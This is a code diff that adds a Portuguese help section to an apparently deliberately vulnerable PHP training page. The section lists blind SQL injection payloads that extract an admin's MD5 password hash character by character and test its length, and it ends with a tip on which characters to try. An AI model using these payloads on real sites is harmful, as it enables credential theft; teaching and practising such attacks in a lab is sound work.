@@ -170,6 +170,37 @@ include("db.php");
                     </div>
                 </div>
             </div>
+
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="headingPassword">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapsePassword">
+                        Extração de Senhas
+                    </button>
+                </h2>
+                <div id="collapsePassword" class="accordion-collapse collapse" data-bs-parent="#blindExamples">
+                    <div class="accordion-body">
+                        <strong>Primeiro caractere da senha do admin:</strong><br>
+                        <code>1 AND (SELECT SUBSTR(password,1,1) FROM user WHERE username='admin') = '4'</code><br><br>
+
+                        <strong>Segundo caractere da senha do admin:</strong><br>
+                        <code>1 AND (SELECT SUBSTR(password,2,1) FROM user WHERE username='admin') = '8'</code><br><br>
+
+                        <strong>Terceiro caractere da senha do admin:</strong><br>
+                        <code>1 AND (SELECT SUBSTR(password,3,1) FROM user WHERE username='admin') = '2'</code><br><br>
+
+                        <strong>Quarto caractere da senha do admin:</strong><br>
+                        <code>1 AND (SELECT SUBSTR(password,4,1) FROM user WHERE username='admin') = 'c'</code><br><br>
+
+                        <strong>Primeiros 4 caracteres (método combinado):</strong><br>
+                        <code>1 AND (SELECT SUBSTR(password,1,4) FROM user WHERE username='admin') = '482c'</code><br><br>
+
+                        <strong>Comprimento da senha:</strong><br>
+                        <code>1 AND (SELECT LENGTH(password) FROM user WHERE username='admin') = 32</code><br><br>
+
+                        <small class="text-muted">💡 <strong>Dica:</strong> Senhas estão em MD5 (32 chars). Teste caracteres: 0-9, a-f</small>
+                    </div>
+                </div>
+            </div>
         </div>
 
                     <div class="mt-3">
